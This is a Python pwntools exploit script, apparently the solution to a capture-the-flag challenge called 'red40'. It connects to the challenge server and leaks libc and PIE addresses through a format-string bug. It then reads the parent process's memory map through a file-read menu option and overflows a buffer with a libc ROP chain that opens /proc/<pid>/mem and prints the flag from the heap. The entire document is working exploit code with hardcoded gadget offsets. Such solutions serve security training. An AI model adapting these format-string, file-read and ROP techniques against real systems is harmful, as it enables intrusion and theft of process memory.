#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./parent", checksec=False)
chall = context.binary = ELF("./red40", checksec=False)
libc = chall.libc


def start(argv=[], *a, **kw):
    nc = "nc red40.ctf.umasscybersec.org 1337"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        if args.GDB:
            return gdb.debug(args=args_, env=env, gdbscript=gdbscript)
        return process(args_, env=env, *a, **kw)


env = {}
gdbscript = """
source ~/.gdbinit-gef-bata24.py
"""


def appreciate():
    io.sendlineafter(b"\n> ", b"1")
    io.recvuntil(b"your ")
    return int(io.recvline().split(b" ")[0])


def consume(n):
    io.sendlineafter(b"\n> ", b"4")
    io.sendlineafter(b"\n> ", str(n).encode())


def warn():
    io.sendlineafter(b"\n> ", b"3")
    io.sendlineafter(b"\n>\n", f"%3$p%13$p".encode())
    leak = io.recvline().strip().split(b"0x")[1:]
    leak = list(map(lambda x: int(x, 16), leak))
    return leak


def steal(filename):
    io.sendlineafter(b"\n> ", b"5")
    io.sendlineafter(b"\n> ", filename)
    io.recvline()
    leak = io.recvuntil(b"You have stolen a lot of red40...", drop=True)
    return leak


def gamble():
    io.sendlineafter(b"\n> ", b"2")
    while True:
        io.sendlineafter(b"\n> ", b"Y")
        io.recvline()
        result = io.recvline()
        if b"YOU LOST" in result:
            continue
        return


io = start()

consume(-(2**16))  # prepare for more RED40 in case of unluck in gambling
with log.progress("gambling") as prog:
    gamble()  # get parent pid
ppid = appreciate()
log.info(f"{ppid=:}")

maps = steal(f"/proc/{ppid}/maps".encode()).split(b"\n")
heap_base = 0
for entry in maps:
    if b"[heap]" in entry:
        heap_base = int(entry.split(b"-")[0], 16)
        break

log.info(f"{heap_base=:#x}")
flag_addr = heap_base + 0x2A0
log.info(f"{flag_addr=:#x}")

libc_leak, pie_leak = warn()
libc.address = libc_leak - 0x1147E2
elf.address = pie_leak - 0x189A
log.info(f"{libc.address=:#x}")
log.info(f"{elf.address=:#x}")

mov_prdi_rcx = libc.address + 0x0018542B  # mov [rdi], rcx; ret;
pop_rdi = libc.address + 0x001BBEA1
pop_rcx = libc.address + 0x0003D1EE
writable = libc.address + 0x21C000
proc_mem_string = writable + 0x2080

payload = b"A" * 0x30 + p64(writable + 0x500)
mem_fd = 4
if args.REMOTE:
    mem_fd = 5  # trial-and-error

rop = None

with context.quiet:
    rop = ROP(libc)

# fmt: off
rop.gets(proc_mem_string)
rop.call("open", (proc_mem_string, 0, 0))            # open(proc_mem_string, O_RDONLY, 0);
rop.call("lseek", (mem_fd, flag_addr, 0))            # lseek(mem_fd, flag_addr, SEEK_SET);
rop.call("read", (mem_fd, writable + 0x1000, 0x30))  # read(mem_fd, buf, 0x30);
rop.puts(writable + 0x1000)
# fmt: on

payload += rop.chain()

io.sendlineafter(b"\n> ", payload)
time.sleep(0.2)
io.sendline(f"/proc/{ppid}/mem".encode())

io.interactive()
